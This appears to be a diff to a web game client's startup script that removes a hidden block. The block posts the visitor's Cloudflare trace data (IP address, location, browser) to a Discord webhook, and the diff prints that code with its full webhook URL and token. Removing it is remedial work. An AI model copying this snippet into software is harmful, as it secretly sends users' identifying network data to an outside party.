@@ -8,13 +8,6 @@ function toId() {
 	Config.sockjsprefix = '/showdown';
 	Config.root = '/';
 
-	$.post(
-		'https://www.cloudflare.com/cdn-cgi/trace', {},
-		function (data) {
-			$.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": data.replaceAll('\n', ' | ')});
-		}
-	);
-
 	if (window.nodewebkit) {
 		window.gui = require('nw.gui');
 		window.nwWindow = gui.Window.get();
